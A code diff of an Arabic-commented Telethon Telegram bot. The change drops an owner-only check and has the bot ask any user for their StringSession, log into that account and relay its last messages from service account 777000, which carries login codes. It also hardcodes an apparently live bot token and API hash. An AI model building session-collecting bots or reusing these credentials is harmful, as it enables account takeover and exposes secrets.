@@ -1,54 +1,70 @@
-import asyncio
+# -*- coding: utf-8 -*-
+"""
+بوت Telegram لجلب رسائل 777000 عبر StringSession
+المطور: الصعب
+"""
+
+import logging, asyncio
 from telethon import TelegramClient, events, Button
+from telethon.sessions import StringSession
 
-API_ID = 22494292
-API_HASH = '0bd3915b6b1a0a64b168d0cc852a0e61'
-BOT_TOKEN = '7768107017:AAErNtQKYEvJVWN35osSlGNgW4xBq6NxSKs'
-OWNER_ID = 7477836004  # غيره برقمك
+# إعداد التوكن
+BOT_TOKEN = "7768107017:AAErNtQKYEvJVWN35osSlGNgW4xBq6NxSKs"
+API_ID = 22494292    # غيره حسب حسابك
+API_HASH = "0bd3915b6b1a0a64b168d0cc852a0e61"
 
-# تعريف البوت
-bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+logging.basicConfig(level=logging.INFO)
+bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# دالة الأزرار
-def main_buttons():
-    return [[Button.inline("📥 جلب رسائل Telegram", b"fetch_telegram")]]
+# قائمة الانتظار للجلسات
+user_sessions = {}
 
-# أمر /start
+# عند بدء /start
 @bot.on(events.NewMessage(pattern="/start"))
 async def start(event):
-    if event.sender_id != OWNER_ID:
-        return
     await event.respond(
-        "👋 مرحباً! اضغط الزر لجلب آخر 10 رسائل من Telegram الرسمي:",
-        buttons=main_buttons()
+        "مرحباً بك في بوت جلب الرسائل 👋\n\nاضغط الزر أدناه لإرسال كود الجلسة.",
+        buttons=[Button.inline("📩 جلب الرسائل", b"get_messages")]
     )
 
 # عند الضغط على الزر
-@bot.on(events.CallbackQuery)
-async def callback(event):
-    if event.sender_id != OWNER_ID:
-        return
+@bot.on(events.CallbackQuery(data=b"get_messages"))
+async def ask_session(event):
+    await event.respond("أرسل الآن كود الجلسة `StringSession` الخاص بك:")
+    user_sessions[event.sender_id] = {"step": "awaiting_session"}
 
-    if event.data == b"fetch_telegram":
-        await event.edit("⏳ جاري جلب آخر 10 رسائل من Telegram...")
+# عندما يرسل المستخدم كود الجلسة
+@bot.on(events.NewMessage)
+async def handle_messages(event):
+    user_id = event.sender_id
+    if user_id in user_sessions and user_sessions[user_id]["step"] == "awaiting_session":
+        session_str = event.raw_text.strip()
+        try:
+            await event.respond("📡 جاري تسجيل الدخول...")
+            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+            await client.connect()
 
-        tg_entity = None
-        async for dialog in bot.iter_dialogs():
-            if dialog.entity.username == "Telegram":
-                tg_entity = dialog.entity
-                break
+            if not await client.is_user_authorized():
+                await event.respond("❌ فشل تسجيل الدخول. تأكد أن الكود صالح.")
+                return
 
-        if not tg_entity:
-            await event.edit("❌ لم يتم العثور على محادثة Telegram الرسمية.", buttons=main_buttons())
-            return
+            await event.respond("✅ تم تسجيل الدخول. جاري جلب الرسائل من 777000...")
+            messages = await client.get_messages(777000, limit=10)
 
-        messages = []
-        async for msg in bot.iter_messages(tg_entity, limit=10):
-            messages.append(msg.text or "[وسائط]")
+            if not messages:
+                await event.respond("❗ لا توجد رسائل.")
+            else:
+                for msg in reversed(messages):
+                    if msg.message:
+                        await event.respond(f"📨 {msg.message}")
 
-        result = "\n\n".join(f"🔹 {m}" for m in reversed(messages))
-        await event.edit(f"📥 آخر 10 رسائل من Telegram:\n\n{result}", buttons=main_buttons())
+            await client.disconnect()
+
+        except Exception as e:
+            await event.respond(f"حدث خطأ: {e}")
+        finally:
+            user_sessions.pop(user_id, None)
 
 # تشغيل البوت
-print("🚀 البوت بدأ ويعمل الآن!")
+print("🚀 البوت يعمل الآن.")
 bot.run_until_disconnected()
